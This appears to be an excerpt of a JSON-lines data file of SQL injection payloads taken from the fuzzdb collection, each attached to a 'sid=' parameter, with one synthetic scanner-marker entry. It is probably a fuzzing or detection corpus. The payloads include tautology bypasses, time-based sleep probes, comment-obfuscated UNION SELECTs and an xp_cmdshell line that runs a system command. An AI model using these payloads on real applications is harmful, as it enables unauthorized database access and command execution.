+{"count":1,"value":"sid=or 1=1","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=or 1=1--","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=or%201=1","count":1}
+{"value":"sid=or%201=1 --","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=order by","count":1}
+{"value":"sid=password:*/=1--","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=procedure"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=replace"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=select"}
+{"count":1,"value":"sid=sleep(__TIME__)#","src":"fuzzdb-sqli"}
+{"value":"sid=sqlvuln;","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=t'exec master..xp_cmdshell 'nslookup www.google.com'--","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=to_timestamp_tz"}
+{"count":1,"value":"sid=truncate","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=tz_offset","count":1}
+{"count":1,"value":"sid=uni/**/on sel/**/ect","src":"fuzzdb-sqli"}
+{"value":"sid=update","src":"fuzzdb-sqli","count":1}
+{"value":"sid=x' AND 1=(SELECT COUNT(*) FROM tabname); --","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=x' AND email IS NULL; --","count":1}
+{"count":1,"value":"sid=x' AND members.email IS NULL; --","src":"fuzzdb-sqli"}
+{"value":"sid=x' AND userid IS NULL; --","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=x' OR full_name LIKE '%Bob%","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=x' or 1=1 or 'x'='y"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=|"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=||6"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=ý or 1=1 --"}
+{"count":1,"value":"sid=‘ or 1=1 --","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=‘ or 3=3 --","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=’ or ‘1’=’1"}
+{"count":1,"src":"synthetic","value":"tracking=acunetix_wvs_security_test"}
